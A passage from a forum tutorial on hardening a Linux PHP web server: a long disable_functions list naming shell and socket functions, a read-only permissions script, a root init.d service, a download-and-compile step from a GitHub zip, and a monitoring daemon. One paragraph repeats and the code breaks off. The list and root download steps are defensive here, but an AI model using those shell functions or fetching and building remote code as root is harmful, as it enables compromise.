#0000BB">posix_setuid</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_get_option</span><span style="color: #007700">,</span><span style="color: #0000BB">ftp_check</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_enable_crypto</span><span style="color: #007700">,</span><span style="color: #0000BB">port_bind_bd_c</span><span style="color: #007700">,</span><span style="color: #0000BB">proc_open</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_wifsignaled</span><span style="color: #007700">,</span><span style="color: #0000BB">proc_deutf</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_seteuid</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_uname</span><span style="color: #007700">,</span><span style="color: #0000BB">get_current_user</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_create_pair</span><span style="color: #007700">,</span><span style="color: #0000BB">proc_nice</span><span style="color: #007700">,</span><span style="color: #0000BB">curl_errno</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_sendsocket_sendto</span><span style="color: #007700">,</span><span style="color: #0000BB">mkdir</span><span style="color: #007700">,</span><span style="color: #0000BB">system</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_get_line</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getpid</span><span style="color: #007700">,</span><span style="color: #0000BB">highlight_file</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_create_listen</span><span style="color: #007700">,</span><span style="color: #0000BB">mysql_list_dbs</span><span style="color: #007700">,</span><span style="color: #0000BB">listen</span><span style="color: #007700">,</span><span style="color: #0000BB">imap_body</span><span style="color: #007700">,</span><span style="color: #0000BB">shell</span><span style="color: #007700">,</span><span style="color: #0000BB">ini_alter</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_setpgid</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_bind</span><span style="color: #007700">,</span><span style="color: #0000BB">link</span><span style="color: #007700">,</span><span style="color: #0000BB">getmyuid</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getpgid</span><span style="color: #007700">,</span><span style="color: #0000BB">ini_restore</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_setsid</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_set_write_buffer</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getegid</span><span style="color: #007700">,</span><span style="color: #0000BB">eof_ctrl_dir</span><span style="color: #007700">,</span><span style="color: #0000BB">getrusage</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_set_timeout</span><span style="color: #007700">,</span><span style="color: #0000BB">ini_get_all</span><span style="color: #007700">,</span><span style="color: #0000BB">apache_get_modules</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_server</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_filter_remove</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_setgid</span><span style="color: #007700">,</span><span style="color: #0000BB">proc_close</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_shutdown</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_listen</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_encoding</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getgrnam</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_wrapper_unregister</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_get_meta_data</span><span style="color: #007700">,</span><span style="color: #0000BB">getmicrotime</span><span style="color: #007700">,</span><span style="color: #0000BB">fpassthru</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_recv</span><span style="color: #007700">,</span><span style="color: #0000BB">virtual</span><span style="color: #007700">,</span><span style="color: #0000BB">chgrp</span><span style="color: #007700">,</span><span style="color: #0000BB">presets_rlph</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getuid</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_filter_prepend</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_get_transports</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_context_get_options</span><span style="color: #007700">,</span><span style="color: #0000BB">set_time_limit</span><span style="color: #007700">,</span><span style="color: #0000BB">exec</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getpgrp</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_register_wrapper</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_get_name</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_bucket_new</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_get_last_error</span><span style="color: #007700">,</span><span style="color: #0000BB">gethostbyname</span><span style="color: #007700">,</span><span style="color: #0000BB">getcwd</span><span style="color: #007700">(),</span><span style="color: #0000BB">chroot</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_close</span><span style="color: #007700">,</span><span style="color: #0000BB">escapeshellarg</span><span style="color: #007700">,</span><span style="color: #0000BB">fsockopen</span><span style="color: #007700">,</span><span style="color: #0000BB">passthru</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_wrapper_register</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_strerror</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_get_contents</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_wrapper_restore</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_exec</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_connect</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_bucket_prepend</span><span style="color: #007700">,</span><span style="color: #0000BB">chown</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_strerror</span><span style="color: #007700">,</span><span style="color: #0000BB">curl_multi_exec</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_fork</span><span style="color: #007700">,</span><span style="color: #0000BB">apache_child_terminate&nbsp;<br /></span>
</span>
</code></code></div>
</div>and beginners can check <a href="http://www.madirish.net/199" target="_blank">HERE </a>for help and learn how to do these things.<br />
<br />
All I said was simple and there were not any special things and maybe easy to bypass, but do NOT hurry. Let me explain more and then we shall be to continue. By that disable functions and php config we disabled the RCE vulnerabilities and something more that you know they appear with those functions, so copy this python script in your public_html folder and run it. It will change file and folder permissions [remove write permission]. After you setup your website and finish, you must close “write permission” on every folder and files in public_html. On this way anyone can’t upload anything on your website and if you want to upload anything, you have to upload on database, or if you want to upload in the public_html folder you must open permission for the second time and upload your files and close it again, Now We know that uploading and file writing begin to disable on our server in a simple way.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:204px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">import&nbsp;os<br /></span><span style="color: #FF8000">#perm.py<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/perm.py<br />#Ali&nbsp;Razmjoo<br /></span><span style="color: #007700">for&nbsp;</span><span style="color: #0000BB">dirname</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">dirnames</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">filenames&nbsp;in&nbsp;os</span><span style="color: #007700">.</span><span style="color: #0000BB">walk</span><span style="color: #007700">(</span><span style="color: #DD0000">'/home/zeroday/public_html/'</span><span style="color: #007700">):&nbsp;</span><span style="color: #FF8000">#change&nbsp;directory&nbsp;or&nbsp;copy&nbsp;file&nbsp;to&nbsp;public_html&nbsp;directory&nbsp;and&nbsp;set&nbsp;directory&nbsp;('.')<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">for&nbsp;</span><span style="color: #0000BB">subdirname&nbsp;in&nbsp;dirnames</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">path</span><span style="color: #007700">.</span><span style="color: #0000BB">join</span><span style="color: #007700">(</span><span style="color: #0000BB">dirname</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">subdirname</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">f</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">2</span><span style="color: #007700">:&#93;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">cmd&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'chmod&nbsp;555&nbsp;'&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">f</span><span style="color: #007700">)&nbsp;</span><span style="color: #FF8000">#555&nbsp;Perm&nbsp;for&nbsp;Folders<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">cmd</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">filename&nbsp;in&nbsp;filenames</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">path</span><span style="color: #007700">.</span><span style="color: #0000BB">join</span><span style="color: #007700">(</span><span style="color: #0000BB">dirname</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">filename</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">f</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">2</span><span style="color: #007700">:&#93;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">cmd&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'chmod&nbsp;444&nbsp;'&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">f</span><span style="color: #007700">)&nbsp;</span><span style="color: #FF8000">#444&nbsp;Perm&nbsp;for&nbsp;Files<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">cmd</span><span style="color: #007700">)&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>Note: This script set 555 permission for folders and 444 for files.<br />
Note: All scripts are not coded in professional coding mode so take it easy. I wrote them so fast.<br />
<br />
Now it’s time for our little baby robot. What does it have to do for us? How does it work? I made a mini robot that add a service named “zeroday” in your OS [Linux base] and then open some Subprocess and start working , what’s his job ?<br />
<br />
1- Check for DOS/DDOS attack from inside and outside<br />
2- Check MD5 for public_html files<br />
<br />
And now about source codes and explain. At first you must create file with name “zeroday” in /etc/init.d/ zeroday is the beginning of your service name. [work with command “service zeroday start/stop”] and here is sourcode code.<br />
<br />
Note: You can choose a different service name [‘zeroday’ or anything you like].<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#!/bin/bash<br />#found&nbsp;on&nbsp;google<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/zeroday<br />#zeroday<br /></span><span style="color: #0000BB">WORK_DIR</span><span style="color: #007700">=</span><span style="color: #DD0000">"/var/lib/foo"<br /></span><span style="color: #0000BB">DAEMON</span><span style="color: #007700">=</span><span style="color: #DD0000">"/usr/bin/python"<br /></span><span style="color: #0000BB">ARGS</span><span style="color: #007700">=</span><span style="color: #DD0000">"/root/zeroday.py"<br /></span><span style="color: #0000BB">PIDFILE</span><span style="color: #007700">=</span><span style="color: #DD0000">"/var/run/foo.pid"<br /></span><span style="color: #0000BB">USER</span><span style="color: #007700">=</span><span style="color: #DD0000">"root"&nbsp;</span><span style="color: #FF8000">#you&nbsp;must&nbsp;run&nbsp;this&nbsp;process&nbsp;as&nbsp;root<br /></span><span style="color: #0000BB">KILL</span><span style="color: #007700">=</span><span style="color: #DD0000">"/root/kill.py"<br /></span><span style="color: #007700">case&nbsp;</span><span style="color: #DD0000">"$1"&nbsp;</span><span style="color: #0000BB">in<br />&nbsp;&nbsp;start</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Starting&nbsp;server"<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">mkdir&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">p&nbsp;</span><span style="color: #DD0000">"</span><span style="color: #0000BB">$WORK_DIR</span><span style="color: #DD0000">"<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon&nbsp;&nbsp;</span><span style="color: #007700">--</span><span style="color: #0000BB">start&nbsp;</span><span style="color: #007700">--</span><span style="color: #0000BB">pidfile&nbsp;$PIDFILE&nbsp;</span><span style="color: #007700">\&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--</span><span style="color: #0000BB">user&nbsp;$USER&nbsp;</span><span style="color: #007700">\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-</span><span style="color: #0000BB">b&nbsp;</span><span style="color: #007700">--</span><span style="color: #0000BB">make</span><span style="color: #007700">-</span><span style="color: #0000BB">pidfile&nbsp;</span><span style="color: #007700">\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--</span><span style="color: #0000BB">chuid&nbsp;$USER&nbsp;</span><span style="color: #007700">\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--</span><span style="color: #0000BB">exec&nbsp;$DAEMON&nbsp;$ARGS<br />&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">;;<br />&nbsp;&nbsp;</span><span style="color: #0000BB">stop</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Stopping&nbsp;server"<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon&nbsp;</span><span style="color: #007700">--</span><span style="color: #0000BB">stop&nbsp;</span><span style="color: #007700">--</span><span style="color: #0000BB">pidfile&nbsp;$PIDFILE&nbsp;</span><span style="color: #007700">--</span><span style="color: #0000BB">verbose<br />&nbsp;&nbsp;python&nbsp;$KILL<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">;;<br />&nbsp;&nbsp;*)<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Usage:&nbsp;/etc/init.d/</span><span style="color: #0000BB">$USER</span><span style="color: #DD0000">&nbsp;{start|stop}"<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">exit&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">;;<br /></span><span style="color: #0000BB">esac<br /></span><span style="color: #007700">exit&nbsp;</span><span style="color: #0000BB">0&nbsp;<br /></span>
</span>
</code></code></div>
</div>Now it’s time for our little baby robot. What does it have to do for us? How does it work? I made a mini robot that add a service named “zeroday” in your OS [Linux base] and then open some Subprocess and start working , what’s his job ?<br />
<br />
1- Check for DOS/DDOS attack from inside and outside<br />
2- Check MD5 for public_html files<br />
<br />
And now about source codes and explain. At first you must create file with name “zeroday” in /etc/init.d/ zeroday is the beginning of your service name. [work with command “service zeroday start/stop”] and here is sourcode code.<br />
Note: You can choose a different service name [‘zeroday’ or anything you like].<br />
<br />
Explain this code:<br />
I found this code in google and it’s gonna help us make a service very easy on linux. Look at this like: <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:36px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">ARGS</span><span style="color: #007700">=</span><span style="color: #DD0000">"/root/zeroday.py"&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>zeroday.py is main starting script of robot.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:36px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">KILL</span><span style="color: #007700">=</span><span style="color: #DD0000">"/root/kill.py"&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>kill.py execute when we want stop robot[service].<br />
<br />
Note: You must create these files in same directory or change directory in service bash script.<br />
Note: As you see in line 12 , we must install ‘start-stop-daemon’ so download and install it.<br />
<br />
Download Daemon tools: <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:72px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">wget&nbsp;https</span><span style="color: #007700">:</span><span style="color: #FF8000">//raw.githubusercontent.com/Ali-Razmjoo/z3r0d4y/master/daemon.zip<br /></span><span style="color: #0000BB">unzip&nbsp;daemon</span><span style="color: #007700">.</span><span style="color: #0000BB">zip<br />cd&nbsp;daemon<br />make&nbsp;<br /></span>
</span>
</code></code></div>
</div>And if you get any error, or you don’t have gcc:<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:72px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">yum&nbsp;install&nbsp;gcc<br />gcc&nbsp;start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon</span><span style="color: #007700">.</span><span style="color: #0000BB">c&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">o&nbsp;start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon<br />cp&nbsp;start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">usr</span><span style="color: #007700">/</span><span style="color: #0000BB">sbin</span><span style="color: #007700">/<br /></span><span style="color: #0000BB">chmod&nbsp;755&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">usr</span><span style="color: #007700">/</span><span style="color: #0000BB">sbin</span><span style="color: #007700">/</span><span style="color: #0000BB">start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon&nbsp;<br /></span>
</span>
</code></code></div>
</div><div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:288px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#zeroday.py<br />#!/usr/bin/python<br />#Ali&nbsp;Razmjoo&nbsp;<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/zeroday.py<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()&nbsp;&nbsp;</span><span style="color: #FF8000">#start&nbsp;multiprocessing<br /></span><span style="color: #0000BB">def&nbsp;stop</span><span style="color: #007700">(</span><span style="color: #0000BB">signum</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">frame</span><span style="color: #007700">):<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">stop_event</span><span style="color: #007700">.</span><span style="color: #0000BB">set</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">signal</span><span style="color: #007700">.</span><span style="color: #0000BB">signal</span><span style="color: #007700">(</span><span style="color: #0000BB">signal</span><span style="color: #007700">.</span><span style="color: #0000BB">SIGTERM</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">stop</span><span style="color: #007700">)<br />if&nbsp;</span><span style="color: #0000BB">__name__&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #DD0000">'__main__'</span><span style="color: #007700">:&nbsp;</span><span style="color: #FF8000">#start&nbsp;software<br />&nbsp;&nbsp;</span><span style="color: #007700">while&nbsp;</span><span style="color: #0000BB">not&nbsp;stop_event</span><span style="color: #007700">.</span><span style="color: #0000BB">is_set</span><span style="color: #007700">():&nbsp;</span><span style="color: #FF8000">#while&nbsp;bash&nbsp;script&nbsp;not&nbsp;stop&nbsp;....<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">subpro_in&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">Popen</span><span style="color: #007700">(&#91;</span><span style="color: #DD0000">'python'</span><span style="color: #007700">,</span><span style="color: #DD0000">'/root/in.py'</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">stdout</span><span style="color: #007700">=</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">PIPE</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">pid_in&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">subpro_in</span><span style="color: #007700">.</span><span style="color: #0000BB">pid</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">subpro_out&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">Popen</span><span style="color: #007700">(&#91;</span><span style="color: #DD0000">'python'</span><span style="color: #007700">,</span><span style="color: #DD0000">'/root/out.py'</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">stdout</span><span style="color: #007700">=</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">PIPE</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">pid_out&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">subpro_out</span><span style="color: #007700">.</span><span style="color: #0000BB">pid</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">subpro_24&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">Popen</span><span style="color: #007700">(&#91;</span><span style="color: #DD0000">'python'</span><span style="color: #007700">,</span><span style="color: #DD0000">'/root/24ban.py'</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">stdout</span><span style="color: #007700">=</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">PIPE</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">pid_24&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">subpro_24</span><span style="color: #007700">.</span><span style="color: #0000BB">pid</span><span style="color: #007700">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">subpro_md5&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">Popen</span><span style="color: #007700">(&#91;</span><span style="color: #DD0000">'python'</span><span style="color: #007700">,</span><span style="color: #DD0000">'/root/md5.py'</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">stdout</span><span style="color: #007700">=</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">PIPE</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">pid_md5&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">subpro_md5</span><span style="color: #007700">.</span><span style="color: #0000BB">pid</span><span style="color: #007700">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">loop&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">#keep&nbsp;this&nbsp;process&nbsp;active<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">1000</span><span style="color: #007700">)&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>Note: Copy this script in /root/ directory, If you want change directory, Don’t forget to change it in source codes too.<br />
And other files you need to have in root directory:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#!/usr/bin/python<br />#24ban.py<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/24ban.py<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()<br />while&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">:<br />&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">120</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: 